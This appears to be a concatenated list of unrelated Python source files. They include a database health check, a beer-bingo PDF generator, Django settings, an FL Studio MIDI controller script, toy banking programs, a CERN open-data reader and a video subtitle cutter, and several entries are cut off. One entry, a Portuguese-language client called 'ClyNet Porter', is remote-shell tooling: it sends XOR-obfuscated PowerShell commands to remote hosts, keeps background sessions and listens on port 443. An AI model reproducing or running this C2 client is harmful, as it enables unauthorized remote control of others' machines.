= time.perf_counter_ns()\n    try:\n        await db_session.execute(statement=text(\"SELECT 1\"))\n        end = time.perf_counter_ns()\n        status = Status.PASS\n    except Exception as e:\n        end = time.perf_counter_ns()\n        status = Status.FAIL\n        output = str(e)\n\n    return HealthCheck(\n        status=status,\n        version=importlib.metadata.version(\"sophrosyne\"),\n        checks=Check(\n            sub_components={\n                \"database:responseTime\": [\n                    SubComponent(\n                        status=status,\n                        output=output,\n                        observed_value=str(end - begin),\n                        observed_unit=\"ns\",\n                        component_type=\"datastore\",\n                        time=datetime.now(timezone.utc),\n                    )\n                ],\n            }\n        ),\n    )\n\n\nasync def do_healthcheck(db_session: AsyncSession) -> HealthCheck:\n    \"\"\"Perform a health check.\n\n    Args:\n        db_session (AsyncSession): The database session.\n\n    Returns:\n        HealthCheck: The health check result.\n    \"\"\"\n    try:\n        await db_session.execute(statement=text(\"SELECT 1\"))\n    except Exception:\n        return HealthCheck(\n            status=Status.FAIL,\n        )\n    return HealthCheck(\n        status=Status.PASS,\n    )\n",
    "from fpdf.enums import XPos, YPos\n\nfrom fpdf import fpdf\n\nimport numpy as np\n\nfrom datetime import date, timedelta\n\n\nclass SPZPDF(fpdf.FPDF):\n    def __init_(self, *args, **kwargs):\n        super(SPZPDF, self).__init__(orientation='L', unit='mm', format='A4', font_cache_dir='/tmp')\n        self.add_font('DejaVu', '', '/usr/share/fonts/truetype/dejavu/DejaVuSansCondensed.ttf', uni=True)\n        self.add_font('DejaVu', 'B', '/usr/share/fonts/truetype/dejavu/DejaVuSansCondensed-Bold.ttf', uni=True)\n\n\nclass CertificateGenerator(SPZPDF):\n    def header(this):\n        this.width = 40\n        this.height = 10\n\n        this.set_font('Helvetica', '', size=36)\n\n    def generateSheet(this, boxes, scale):\n        # font size setting of the page\n        boxes = randomize(boxes)\n        this.set_margin(0)\n        this.set_font('Helvetica', '', size=32)\n        this.set_font(style=\"B\")\n        # self.pdf.set_font(style=\"U\")\n        length = 40\n        border = 1\n        this.set_y(20)\n        this.cell(200, 10, \"Beer Bingo\", align=\"C\", new_x=XPos.LMARGIN, new_y=YPos.NEXT)\n        this.set_font('Helvetica', 'B', size=16)\n        this.set_xy(10, this.y + 20)\n        this.cell(200, 10, \"Drinking sheet by:\", align=\"L\", new_x=XPos.LMARGIN, new_y=YPos.NEXT)\n\n        this.set_y(70)\n        # creation of first row with 5 categories\n        this.set_x(20)\n        index = 0\n        for r_i in range(scale):\n            for c_i in range(scale):\n                this.multi_cell(length, length, boxes[index],\n                                border=border, align=\"C\", new_x=\"RIGHT\", new_y=\"TOP\", max_line_height=10)\n                index += 1\n            this.set_left_margin(20)\n            this.set_y(this.y + length)\n\n        this.set_y(this.y + 25)\n        this.set_font('Helvetica', '', size=16)\n        this.cell(200, 10, \"I will have a hangover on \" + str(date.today()+timedelta(days=1)) + \"...    yeah :)\")\n        this.add_page()\n\n    def generateDocument(this, categories, num, scale):\n\n        for index in range(num):\n            this.generateSheet(categories, scale)\n\n        this.output(\"Beer_Bingo_{0}x{1}.pdf\".format(scale, scale))\n\n\ndef randomize(dict):\n    array = []\n    array = dict\n    np.random.shuffle(array)\n    return array\n\n\nif __name__ == '__main__':\n    # put in the categories that should be shuffled\n    categories = [\n        \"CHEERS!\",\n        \"WHEAT\",\n        \"DARK\",\n        \"LIGHT\",\n        \"PILSNER\",\n        \"I don't really like beer, but I like this!\",\n        \"TALL GUY (0.5l)\",\n        \"BITTER\",\n        \"SWEET\",\n        \"Oetti\",\n        \"MUG CLUB\",\n        \"WINTER\",\n        \"ALE\",\n        \"Tannenz\u00e4pfle\",\n        \"HOEPFNER\",\n        \"SLOW BEER\"\n    ]\n\n    # config\n\n    number_of_sheets = 10\n    # scaling factor, put 4 for 4x4 = 16 squares or 3 for 3x3 = 9 squares\n    scaling = 4\n\n    # generating code\n    if len(categories) < scaling * scaling:\n        print(\"There are not enough categories given for the number of boxes. Add \"\n              + str(scaling * scaling - len(categories)) + \" categories to create a pdf sheet.\")\n    else:\n        pdfGen = CertificateGenerator()\n        pdfGen.add_page()\n        pdfGen.generateDocument(categories, number_of_sheets, scaling)\n",
    "from setuptools import setup, find_packages\n\nwith open('README.md') as readme_file:\n    readme = readme_file.read()\n\nsetup(\n    author=\"Nina Prakash\",\n    author_email='Nina.Prakash@nrel.gov',\n    python_requires='>=3.5',\n    classifiers=[\n        'Development Status :: 4 - Beta',\n        'Intended Audience :: Science/Research',\n        'Intended Audience :: Manufacturing',\n        'Topic :: Scientific/Engineering :: Physics',\n        'Topic :: Scientific/Engineering :: Chemistry',\n        'Topic :: Scientific/Engineering :: Image Processing',\n        'License :: OSI Approved :: MIT License',\n        'Natural Language :: English',\n        'Environment :: GPU',\n        'Environment :: GPU :: NVIDIA CUDA',\n        'Programming Language :: Python :: 3',\n        'Programming Language :: Python :: 3.5',\n        'Programming Language :: Python :: 3.6',\n        'Programming Language :: Python :: 3.7',\n        'Programming Language :: Python :: 3.8',\n        'Programming Language :: Python :: 3.9',\n        'Programming Language :: Python :: 3.10',\n    ],\n    description=\"ExpertSegmentation is a tool for segmenting microscopy with expert-user informed domain targets\",\n    long_description=readme,\n    long_description_content_type='text/markdown',\n    include_package_data=True,\n    keywords='expertsegmentation',\n    name='expertsegmentation',\n    packages=find_packages(include=['expertsegmentation', 'expertsegmentation.*']),\n    url='https://github.com/NREL/expertsegmentation',\n    version='1.0',\n    zip_safe=False,\n)",
    "\"\"\"\nDjango settings for core project.\n\nGenerated by 'django-admin startproject' using Django 4.2.8.\n\nFor more information on this file, see\nhttps://docs.djangoproject.com/en/4.2/topics/settings/\n\nFor the full list of settings and their values, see\nhttps://docs.djangoproject.com/en/4.2/ref/settings/\n\"\"\"\n\nfrom pathlib import Path\n\n# Build paths inside the project like this: BASE_DIR / 'subdir'.\nBASE_DIR = Path(__file__).resolve().parent.parent\n\n\n# Quick-start development settings - unsuitable for production\n# See https://docs.djangoproject.com/en/4.2/howto/deployment/checklist/\n\n# SECURITY WARNING: keep the secret key used in production secret!\nSECRET_KEY = 'django-insecure-ksofee!d=*4dc(d29*9nyb6=ebhxdv($_#ige#ybo)^t!z_ws^'\n\n# SECURITY WARNING: don't run with debug turned on in production!\nDEBUG = True\n\nALLOWED_HOSTS = []\n\n\n# Application definition\n\nINSTALLED_APPS = [\n    'django.contrib.admin',\n    'django.contrib.auth',\n    'django.contrib.contenttypes',\n    'django.contrib.sessions',\n    'django.contrib.messages',\n    'django.contrib.staticfiles',\n    \"app_main\",\n]\n\nMIDDLEWARE = [\n    'django.middleware.security.SecurityMiddleware',\n    'django.contrib.sessions.middleware.SessionMiddleware',\n    'django.middleware.common.CommonMiddleware',\n    'django.middleware.csrf.CsrfViewMiddleware',\n    'django.contrib.auth.middleware.AuthenticationMiddleware',\n    'django.contrib.messages.middleware.MessageMiddleware',\n    'django.middleware.clickjacking.XFrameOptionsMiddleware',\n]\n\nROOT_URLCONF = 'core.urls'\n\nTEMPLATES = [\n    {\n        'BACKEND': 'django.template.backends.django.DjangoTemplates',\n        'DIRS': [],\n        'APP_DIRS': True,\n        'OPTIONS': {\n            'context_processors': [\n                'django.template.context_processors.debug',\n                'django.template.context_processors.request',\n                'django.contrib.auth.context_processors.auth',\n                'django.contrib.messages.context_processors.messages',\n            ],\n        },\n    },\n]\n\nWSGI_APPLICATION = 'core.wsgi.application'\n\n\n# Database\n# https://docs.djangoproject.com/en/4.2/ref/settings/#databases\n\nDATABASES = {\n    'default': {\n        'ENGINE': 'django.db.backends.sqlite3',\n        'NAME': BASE_DIR / 'db.sqlite3',\n    }\n}\n\n\n# Password validation\n# https://docs.djangoproject.com/en/4.2/ref/settings/#auth-password-validators\n\nAUTH_PASSWORD_VALIDATORS = [\n    {\n        'NAME': 'django.contrib.auth.password_validation.UserAttributeSimilarityValidator',\n    },\n    {\n        'NAME': 'django.contrib.auth.password_validation.MinimumLengthValidator',\n    },\n    {\n        'NAME': 'django.contrib.auth.password_validation.CommonPasswordValidator',\n    },\n    {\n        'NAME': 'django.contrib.auth.password_validation.NumericPasswordValidator',\n    },\n]\n\n\n# Internationalization\n# https://docs.djangoproject.com/en/4.2/topics/i18n/\n\nLANGUAGE_CODE = 'en-us'\n\nTIME_ZONE = 'UTC'\n\nUSE_I18N = True\n\nUSE_TZ = True\n\n\n# Static files (CSS, JavaScript, Images)\n# https://docs.djangoproject.com/en/4.2/howto/static-files/\n\nSTATIC_URL = 'static/'\nMEDIA_ROOT = BASE_DIR / 'media'\nMEDIA_URL = '/media/'\nML_ROOT = BASE_DIR / 'ml'\n\n# Default primary key field type\n# https://docs.djangoproject.com/en/4.2/ref/settings/#default-auto-field\n\nDEFAULT_AUTO_FIELD = 'django.db.models.BigAutoField'\n",
    "#name=AKAI APC mini MKii (Performance Mode)\r\n\r\n#\r\n# Akai APC mini Mk2 - Communication Protocol PDF\r\n#\r\n# https://cdn.inmusicbrands.com/akai/attachments/APC%20mini%20mk2%20-%20Communication%20Protocol%20-%20v1.0.pdf\r\n#\r\n\r\n#\r\n# (unofficial) FL Studio Python API Reference\r\n#\r\n# https://miguelguthridge.github.io/FL-Studio-API-Stubs/\r\n#\r\n\r\n#\r\n# List of Script Events (On... Functions)\r\n#\r\n# https://www.image-line.com/fl-studio-learning/fl-studio-online-manual/html/midi_scripting.htm#script_events\r\n#\r\n\r\nimport math\r\n\r\nimport midi\r\nimport device\r\nimport playlist\r\nimport transport\r\nimport utils\r\n\r\n\r\ndef OnInit():\r\n    clearLights()\r\n    updateLights()\r\n\r\n\r\ndef OnDeInit():\r\n    clearLights()\r\n\r\n\r\nzone_offset_x = 0\r\nzone_offset_y = 0\r\n\r\ndef OnNoteOn(event):\r\n    global zone_offset_x\r\n    global zone_offset_y\r\n\r\n    event.handled = True\r\n    print('Midi note on:', event.data1, \" \", event.data2)\r\n\r\n    flag = 1 # trigger schedule ?\r\n    if transport.isPlaying():\r\n        flag = 2 # trigger now ?\r\n\r\n    if (event.data1 <= 63):\r\n        print('Note Location: Grid Pad')\r\n        trackIndexBottomUpZeroSeven = (math.ceil((event.data1 + 1) / 8) - 1)\r\n\r\n        trackIndex = (8 - trackIndexBottomUpZeroSeven) + zone_offset_y\r\n        blockNum = (event.data1 - (trackIndexBottomUpZeroSeven * 8)) + zone_offset_x\r\n\r\n        print ('triggering track:', trackIndex, ' block:', blockNum)\r\n\r\n        playlist.triggerLiveClip(trackIndex, blockNum, flag, -1)\r\n        playlist.refreshLiveClips()\r\n\r\n    if event.data1 == 100:\r\n        if transport.isPlaying():\r\n            transport.stop()\r\n        else:\r\n            transport.start()\r\n\r\n    if event.data1 >= 104 and event.data1 <= 107:\r\n        if event.data1 == 104 and zone_offset_y > 0:\r\n            zone_offset_y -= 1\r\n        if event.data1 == 105:\r\n            zone_offset_y += 1\r\n        if event.data1 == 106 and zone_offset_x > 0:\r\n            zone_offset_x -= 1\r\n        if event.data1 == 107:\r\n            zone_offset_x += 1\r\n\r\n        print('New Zone Offsets: ', zone_offset_x, zone_offset_y)\r\n\r\n        playlist.liveDisplayZone(0 + zone_offset_x, 1 + zone_offset_y, 8 + zone_offset_x, 9 + zone_offset_y)\r\n\r\n    if event.data1 >= 112 and event.data1 <= 119:\r\n\r\n        trackIndex = event.data1 - (112 - 1)\r\n\r\n        print('Muting track: ', trackIndex)\r\n\r\n        playlist.triggerLiveClip(trackIndex, -1, flag)\r\n        playlist.refreshLiveClips()\r\n\r\n    updateLights()\r\n\r\n\r\ndef OnNoteOff(event):\r\n    event.handled = True\r\n\r\n\r\ndef clearLights(onlypad=False):\r\n    for i in range(0, 64):\r\n        device.midiOutMsg(0x90 + (i << 8) + (0x00 << 16))\r\n    \r\n    if (onlypad == False):\r\n        for i in range (0x64, 0x78):\r\n            device.midiOutMsg(0x90 + (i << 8) + (0 << 16))\r\n\r\n\r\ndef OnUpdateLiveMode(lastTrack):\r\n    updateLights()\r\n\r\n\r\nlast_beat_val = 0\r\ndef OnUpdateBeatIndicator(value):\r\n    global last_beat_val\r\n\r\n    if (transport.isPlaying() == False):\r\n        device.midiOutMsg(0x90 + (0x64 << 8) + (1 << 16))\r\n        device.midiOutMsg(0x90 + (0x65 << 8) + (0 << 16))\r\n        device.midiOutMsg(0x90 + (0x66 << 8) + (0 << 16))\r\n        device.midiOutMsg(0x90 + (0x67 << 8) + (0 << 16))\r\n        return\r\n\r\n    last_beat_val += 1\r\n    if (value == 1):\r\n        last_beat_val = 1\r\n\r\n    device.midiOutMsg(0x90 + (0x64 << 8) + ((1 if last_beat_val == 1 or last_beat_val == 2 else 0) << 16))\r\n    device.midiOutMsg(0x90 + (0x65 << 8) + ((1 if last_beat_val == 3 or last_beat_val == 4 else 0) << 16))\r\n    device.midiOutMsg(0x90 + (0x66 << 8) + ((1 if last_beat_val == 5 or last_beat_val == 6 else 0) << 16))\r\n    device.midiOutMsg(0x90 + (0x67 << 8) + ((1 if last_beat_val == 7 or last_beat_val == 8 else 0) << 16))\r\n\r\n\r\ndef updateLights():\r\n    global zone_offset_x\r\n    global zone_offset_y\r\n\r\n    is_playing = transport.isPlaying()\r\n\r\n    for x in range(0, 8):\r\n        for y in range (0, 8):\r\n            midiNum = x + y * 8\r\n            trackIndex = (8 - y) + zone_offset_y\r\n            blockIndex = x + zone_offset_x\r\n\r\n            result = playlist.getLiveBlockStatus(trackIndex, blockIndex, midi.LB_Status_Simple)\r\n            # 0 = empty\r\n            # 1 = filled\r\n            # 2 = playing (or scheduled)\r\n            # 3 = scheduled (and not playing)\r\n\r\n            brightness = 0x96\r\n            color = 0\r\n\r\n            blockColor = playlist.getLiveBlockColor(trackIndex, blockIndex)\r\n\r\n            # filled\r\n            if result == 1:\r\n                # color = 41 # cyan\r\n                color = flColorHexToNearestApcIndex(blockColor)\r\n                brightness = 0x91\r\n\r\n            # playing\r\n            if result == 2:\r\n                color = 20 # green\r\n                brightness = 0x96\r\n                # brightness = 0x99\r\n\r\n            # scheduled\r\n            if result == 3:\r\n                if is_playing == False:\r\n                    color = 9 # orange\r\n                else:\r\n                    color = flColorHexToNearestApcIndex(blockColor)\r\n                    brightness = 0x91\r\n\r\n            se",
    "import socket\r\nimport threading\r\n\r\nSERVER_IP = '192.168.0.8'\r\nSERVER_PORT = 12859\r\nSERVER_PORT2 = 12860\r\nLISTEN_PORT = 443\r\nKEY = b'mysecretkey'\r\n\r\nclass ClientSession:\r\n    def __init__(self):\r\n        self.client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\r\n        self.server_host = None\r\n        self.server_port = None\r\n        self.exiting = False\r\n        self.receive_thread = threading.Thread(target=self.receive_server_responses)\r\n        self.current_session = None\r\n        self.client_ip = None  # Vari\u00e1vel para armazenar o IP do cliente\r\n\r\n    def connect_to_server(self, server_host, server_port):\r\n        self.server_host = server_host\r\n        self.server_port = server_port\r\n        try:\r\n            self.client_socket.connect((self.server_host, self.server_port))\r\n            print(f\"Conectado a {self.server_host}:{self.server_port}\")\r\n            self.receive_thread.start()\r\n        except ConnectionRefusedError:\r\n            print(\"Erro: Conex\u00e3o recusada. Verifique se o servidor est\u00e1 em execu\u00e7\u00e3o e se as credenciais est\u00e3o corretas.\")\r\n        except Exception as e:\r\n            print(f\"Erro ao conectar: {e}\")\r\n\r\n    def receive_server_responses(self):\r\n        try:\r\n            while not self.exiting:\r\n                encrypted_response = self.client_socket.recv(4096)\r\n                if not encrypted_response:\r\n                    break\r\n                decrypted_response = self.apply_xor(encrypted_response, KEY)\r\n                print(decrypted_response.decode('utf-8'))\r\n        except Exception as e:\r\n            print(f\"Erro durante a recep\u00e7\u00e3o de dados do servidor: {e}\")\r\n\r\n    def send_command(self, command):\r\n        encrypted_command = self.apply_xor(command.encode(), KEY)\r\n        self.client_socket.sendall(encrypted_command)\r\n\r\n    def apply_xor(self, data, key):\r\n        key_size = len(key)\r\n        return bytes(data_byte ^ key[i % key_size] for i, data_byte in enumerate(data))\r\n\r\n    def leave_background(self, session_info, client_ip):  # Atualiza\u00e7\u00e3o para receber o IP do cliente\r\n        self.current_session = session_info\r\n        self.client_ip = client_ip  # Atualiza o IP do cliente\r\n        print(\"Sess\u00e3o deixada em segundo plano:\", session_info)\r\n        print(\"IP do cliente:\", client_ip)  # Exibe o IP do cliente\r\n\r\n    def list_sessions(self):  # M\u00e9todo para listar sess\u00f5es\r\n        if self.server_host and self.server_port:\r\n            print(f\"Sess\u00e3o em segundo plano: {SERVER_IP}:{SERVER_PORT}\")\r\n            if self.client_ip:\r\n                print(f\"IP do cliente: {self.client_ip}\")\r\n        else:\r\n            print(\"Nenhuma sess\u00e3o em segundo plano ativa.\")\r\n\r\ndef print_menu(client_session):\r\n    ascii_art = \"\"\"\r\n   _____ _             _   _      _     _____         _             \r\n  / ____| |           | \\ | |    | |   |  __ \\       | |            \r\n | |    | |_   _  __ _|  \\| | ___| |_  | |__) | __ _| |_ ___  _ __ \r\n | |    | | | | |/ _` | . ` |/ _ \\ __| |  ___/ '__| __/ _ \\| '__|\r\n | |____| | |_| | (_| | |\\  |  __/ |_  | |   | |  | || (_) | |   \r\n  \\_____|_|\\__,_|\\__, |_| \\_|\\___|\\__| |_|   |_|   \\__\\___/|_|    \r\n                   __/ |                                          \r\n                  |___/                                            \r\n    \"\"\"\r\n    print(ascii_art)\r\n    print(\"1. Conectar a outro servidor\")\r\n    print(\"2. Enviar comando PowerShell\")\r\n    print(\"3. Deixar sess\u00e3o em segundo plano\")\r\n    print(\"4. Listar sess\u00f5es em segundo plano\")\r\n    print(\"5. Encerrar conex\u00e3o\")\r\n    print(\"6. Escolher sess\u00e3o para interagir\")\r\n    print(\"7. Escutar conex\u00e3o de qualquer origem\")\r\n\r\ndef handle_input(client_session):\r\n    while not client_session.exiting:\r\n        print_menu(client_session)\r\n        opcao = input(\"Escolha uma op\u00e7\u00e3o: \")\r\n\r\n        if opcao == '1':\r\n            server_host = input(\"Digite o endere\u00e7o IP do servidor: \")\r\n            server_port = int(input(\"Digite a porta do servidor: \"))\r\n            client_session.connect_to_server(server_host, server_port)\r\n        elif opcao == '2':\r\n            command = input(\"Digite um comando PowerShell (ou 'exit' para sair): \")\r\n            if command.lower() == 'exit':\r\n                client_session.exiting = True\r\n            else:\r\n                client_session.send_command(command)\r\n        elif opcao == '3':\r\n            session_info = f\"Sess\u00e3o em segundo plano: {SERVER_IP}:{SERVER_PORT}\"\r\n            client_session.leave_background(session_info, client_session.client_ip)  # Passa o IP do cliente\r\n            input(\"Pressione Enter para retomar o menu...\")\r\n        elif opcao == '4':\r\n            client_session.list_sessions()  # Chama o m\u00e9todo para listar sess\u00f5es\r\n            input(\"Pressione Enter para retornar ao menu principal...\")\r\n        elif opcao == '5':\r\n            print(\"Encerrando conex\u00e3o...\")\r\n            client_session.exiting = True\r\n        elif opcao == '6':\r\n            manipulate_session(client_session)\r\n        elif opcao == '7':\r\n            listen_for_connections()\r\n ",
    "import time\nfrom decimal import Decimal\n\ndecimal_precision = Decimal('0.01')\n\nsaldo = Decimal('0')\nlimite = Decimal('500')\nextrato = \"\"\nquantidade_saques = 0\nLIMITE_SAQUES = 3\n\nmenu = f\"\"\"\nSeja bem vindo(a)!\n\n[1] Depositar\n[2] Sacar\n[3] Extrato\n[0] Sair\n\n\nDigite a op\u00e7\u00e3o desejada e telcle [Enter]\n=> \"\"\"\n\nwhile True:\n    \n    opcao = input(menu)\n\n    if opcao == \"1\":\n            \n\n        valor_deposito = Decimal(input(\"Informe o valor do dep\u00f3sito: R$ \"))\n        \n        if valor_deposito > 0:\n            \n            saldo += valor_deposito\n            \n            extrato += f\"{time.strftime('%d/%m/%y %X')}  |    Dep\u00f3sito   |  R$ {valor_deposito:.2f}\\n\"\n\n            print(f\"Dep\u00f3sito realizado com sucesso!\")\n        \n        else:\n            print(\"Opera\u00e7\u00e3o falhou! O valor informado \u00e9 inv\u00e1lido.\")\n\n    elif opcao == \"2\":\n        com_saldo = saldo > 0\n\n        if not com_saldo:\n            print(\"Saque n\u00e3o dispon\u00edvel. Verifique seu saldo.\")\n        \n        else:\n            valor_saque = Decimal(input(\"Informe o valor do saque: R$ \"))\n\n            if 0 < valor_saque <= saldo and valor_saque <= limite and quantidade_saques < LIMITE_SAQUES:\n            \n                saldo -= valor_saque\n            \n                extrato += f\"{time.strftime('%d/%m/%y %X')}  |    Saque      | (R$ {valor_saque:.2f})\\n\"\n            \n                quantidade_saques += 1\n                \n                print(\"Saque ralizado com sucesso!\")\n       \n            else:\n                print(\"Opera\u00e7\u00e3o falhou! Verifique seu limite de saque ou quantidade de saques.\")\n\n    elif opcao == \"3\":\n\n        data_hora = time.localtime()\n        data = time.strftime('%d/%m/%y',data_hora)\n        hora = time.strftime('%H:%M:%S',data_hora)\n\n        extrato_formatado = f\"N\u00e3o h\u00e1 registro de movimenta\u00e7\u00f5es.\\n\" if not extrato else extrato\n        \n        saldo_formatado = f\"Saldo em {data} {hora}:           R$ {saldo:.2f}\"\n\n        print(\"\\n===================== EXTRATO =====================\")\n        print(\"\\n===================================================\")\n        print(\"Data/Hora          |   Opera\u00e7\u00e3o    |    Valor\")\n        print(\"===================================================\")\n        print(extrato_formatado)\n        print(f\"\\n{saldo_formatado}\")\n        print(\"======================= FIM =======================\")\n\n    elif opcao == \"0\":\n        print(f\"Obrigado por usar nossos Servi\u00e7os!\")\n        break\n\n    else:\n        print(\"Opera\u00e7\u00e3o inv\u00e1lida, por favor selecione uma op\u00e7\u00e3o dispon\u00edvel.\")\n    ",
    "import json\nfrom datetime import datetime\n\n\nclass Client:\n    def __init__(self, name, salary=0, log=[], date=None, next=None):\n        self.name = name\n        self.salary = salary\n        self.next = next\n        self.date_created = date if date else datetime.now()\n        self._log = log  # A queue of last 3 operation\n\n    def withdrawal(self, amount):\n        if amount <= 0:\n            print(\"Please, enter a positive value\")\n            return\n        if self.salary >= amount:\n            self.salary = self.salary - amount\n            print(f\"{amount}EGP withdrawn successfully\")\n            self.add_to_log(f\"{amount}EGP Withdrawn from your balance\")\n        else:\n            print(\"The requested amount exceeds your salary.\")\n\n    def deposit(self, amount):\n        if amount <= 0:\n            print(\"Please, enter a positive value\")\n            return\n        self.salary += amount\n        print(f\"{amount}EGP deposited successfully\")\n        self.add_to_log(f\"{amount}EGP deposited from your balance\")\n\n    def balance_inquiry(self):\n        print(f\"{self.name} has {self.salary}EGP\")\n\n    def add_to_log(self, data):\n        if len(self._log) > 2:\n            self._log.pop(0)\n        self._log.append(data)\n\n    def print_log(self):\n        if len(self._log) == 0:\n            print(\"No transaction made on salary\")\n        else:\n            for transaction in self._log:\n                print(transaction)\n\n    def __str__(self):\n        return self.name + f\" ({self.salary}EGP)  \" + \"Registered at \" + self.date_created.strftime(\"%H:%M %Y-%m-%d\")\n\n\nclass BankSystem:\n    # linked list\n    def __init__(self):\n        self.head = None\n\n    def print(self):\n        if self.head is None:\n            print(\"No currently clients!\")\n            return\n        itr: Client = self.head\n        displayed_text = ''\n        count = 1\n        while itr:\n            displayed_text += str(\n                count) + '- ' + itr.name + f\" ({itr.salary}EGP)  \" + \"Registered at \" + itr.date_created.strftime(\n                \"%H:%M %Y-%m-%d\") + '\\n'\n            itr = itr.next\n            count += 1\n        print(displayed_text)\n\n    def get_length(self):\n        count = 0\n        itr = self.head\n        while itr:\n            count += 1\n            itr = itr.next\n\n        return count\n\n    def insert_at_begining(self, name, salary=0, log=[]):\n        client = Client(name, salary, log, next=self.head)\n        self.head = client\n        print(f\"Client {name} has been added successfully\")\n\n    def insert_at_end(self, name, salary=0, date=None, log=[]):\n        if self.head is None:\n            self.head = Client(name=name, salary=salary, date=date, log=log, next=None)\n            return\n\n        itr = self.head\n\n        while itr.next:\n            itr = itr.next\n\n        itr.next = Client(name=name, salary=salary, log=log, date=date, next=None)\n        print(f\"Client {name} has been added successfully\")\n\n    def insert_at(self, index, name, salary=0, log=[]):\n        if index < 0 or index > self.get_length():\n            raise Exception(\"Invalid Index\")\n\n        if index == 0:\n            self.insert_at_begining(name, salary)\n            return\n\n        count = 0\n        itr = self.head\n        while itr:\n            if count == index - 1:\n                client = Client(name, salary, next=itr.next)\n                print(f\"Client {name} has been added successfully\")\n                itr.next = client\n                break\n\n            itr = itr.next\n            count += 1\n\n    def remove_at(self, index):\n        index = index - 1\n        if index < 0 or index >= self.get_length():\n            raise Exception(\"Invalid Index!\")\n\n        if index == 0:\n            self.head = self.head.next\n            return\n\n        count = 0\n        itr = self.head\n        while itr:\n            if count == index - 1:\n                itr.next = itr.next.next\n                print(f\"Client number {index + 1} has been removed successfully\")\n                break\n\n            itr = itr.next\n            count += 1\n\n    def select_at(self, index):\n        if self.head is None:\n            print(\"No currently clients!\")\n            return\n        elif index > self.get_length() + 1 or index < 1:\n            raise Exception(\"Invalid Index!\")\n\n        count = 0\n        itr = self.head\n        while itr:\n            if count == index - 1:\n                print(\"here\")\n                return itr\n\n            itr = itr.next\n            count += 1\n        return None\n\n    def insert_values(self, data_list):\n        self.head = None\n        for name, salary in data_list:\n            self.insert_at_end(name, salary)\n        print(f\"Clients have been added successfully\")\n\n    def insert_json_values(self, data: dict):\n        for client in data:\n            attrs = data[client]\n            date = datetime.fromisoformat(attrs[\"date_created\"])\n            self.insert_at_end(name=client,\n                               salary=attrs[\"salary\"],\n                               log=",
    "#import ROOT\nimport uproot\n#from ROOT import RDataFrame\nimport numpy as np\n#import pandas as pd\n#import awkard as ak\n#import TensorFlow as tf\n\n\n#'root://eospublic.cern.ch//eos/opendata/cms/derived-data/PFNano/29-Feb-24/SingleMuon/Run2016G-UL2016_MiniAODv2_PFNanoAODv1/240207_205649/0000/nano_data2016_1.root'\n\nnano_file= uproot.open(\"root://eospublic.cern.ch//eos/opendata/cms/derived-data/PFNano/29-Feb-24/SingleMuon/Run2016G-UL2016_MiniAODv2_PFNanoAODv1/240207_205649/0000/nano_data2016_1.root\")\n#keys = nano_file.GetlistOfKeys()\n#for key in keys:\n#\tobj = key.ReadObj()  \t\t\t# Read the object corresponding to the key\n#\tif isinstance(obj, ROOT.TTree):\t# Check if the object is a TTree\n#\t\t\tprint(obj.GetName())\n\nevents = nano_file[\"Events\"]\npf_dz = events.arrays(filter_name=\"PFCands_dz\",library=\"np\")\npf_dz_csv = pf_dz.to_csv('pf_dz_csv')\n\n\n\n\n# Define your list of cut conditions\n#cut_conditions = [\n#    \"muon_pt > 20\",  # Select events where muon_pt is greater than 20 GeV\n#    #\"abs(muon_eta) < 2.4\",  # Select events where the absolute value of muon_eta is less than 2.4\n    #\"muon_charge == -1\"  # Select events where muon_charge is equal to -1\n#]\n\n# Combine the cut conditions using logical AND (all conditions must be satisfied)\n#combined_cut_condition = \" & \".join(cut_conditions)\n\n# Apply the combined cut and retrieve the selected data\n#selected_data = tree.arrays(\"*\", cut=combined_cut_condition)\n\n# Now you can access the data of the selected events and process it as needed\n\n\n\n\n\n#Overall plan\n#Step 1: Combine the root files.\n\t\t#Currently I am only running over 1 file\n\n#Step 2: What data is relevant in the root files?\n\t\t#Find out what data is important (tracks, pt..etc.)\n\n#Step 3: Convert data from root TTree to arrays\n\t\t#Figure out what kind of arrays to use. (Pandas, numpy, awkard)\n\t\t#Currently above this is using pandas\n\t\t#How will keras/tensor flow handel this?\n\n# Step 4: Define Model Architecture\n\t\t#Pretty sure I dont need a \"complicated\" model. Perhaps just a ordinary Deep NN.\n\t\t#I do not think I need a classifcation NN or Convolution NN. Talk with larry to be sure but perhaps something like this,\n\n#model = Sequential([\n#    Dense(64, activation='relu', input_shape=(input_shape,)),  # Adjust input_shape based on your data\n#    Dense(64, activation='relu'),\n#\tDense(1, activation='sigmoid')\n#])\n#\tcomplie the model\n#model.compile(optimizer=Adam(), loss='binary_crossentropy', metrics=['accuracy'])\n#\tTrain the model\n#model.fit(X_train, y_train, epochs=10, batch_size=32, validation_data=(X_val, y_val))\n#\n#\tEvaluate Model\n#loss, accuracy = model.evaluate(X_test, y_test)\n#print(f\"Test Loss: {loss}, Test Accuracy: {accuracy}\")\n\n\n\n\n",
    "\"\"\"\nVideo Segment Cutter - A program to cut segments of a video based on specified keywords.\n\n\"\"\"\n\nimport argparse\nimport whisper\nfrom moviepy.editor import *\nfrom moviepy.video.tools.subtitles import SubtitlesClip\n\n# python counting-any-words-in-video.py -i OpenAI-testing-video.mp4 -t GPT\nparser = argparse.ArgumentParser(\n    description=\"Example script with command-line arguments\"\n)\nparser.add_argument(\"--input\", \"-i\", help=\"Path to the input file\")\nparser.add_argument(\"--keyword\", \"-t\", help=\"Keyword to count\")\nargs = parser.parse_args()\n\ninput_video_file = args.input\n# input_video_file = \"OpenAI-testing-video.mp4\"\nkeyword = args.keyword\n# keyword = \"GPT-4\"\n\n# parameter\nmax_words_in_line_subtitle = 10\noutput_audio_file = f\"audio_{input_video_file}.mp3\"\n\n# load model\nmodel = whisper.load_model(\"base.en\")\n\n\n# convert video to mp3\ndef convert_to_mp3(input_file, output_file):\n    video = VideoFileClip(input_file)\n    audio = video.audio\n    audio.write_audiofile(output_file)\n\n\nprint(\"Converting video to mp3...\")\nconvert_to_mp3(input_video_file, output_audio_file)\nprint(\"Done!\")\n\n# transcribe mp3 using whisper\nprint(\"Transcribing...\")\ntranscribe_result = model.transcribe(\n    audio=output_audio_file, word_timestamps=True, task=\"transcribe\"\n)\nprint(\"Done!\")\n# print(transcribe_result[\"text\"])\n\n# adjust number of words in each line of subtitle\nsubtitle_list = []\n\nfor subtitle in transcribe_result[\"segments\"]:\n    temp = []\n    word_list = subtitle[\"text\"].split()\n    if len(word_list) > max_words_in_line_subtitle:\n        for index, each_word in enumerate(word_list):\n            if each_word.endswith(\",\") and (index != 0 or index < len(word_list)):\n                temp.append(index)\n    if temp == []:\n        subtitle_list.append(\n            [\n                (\n                    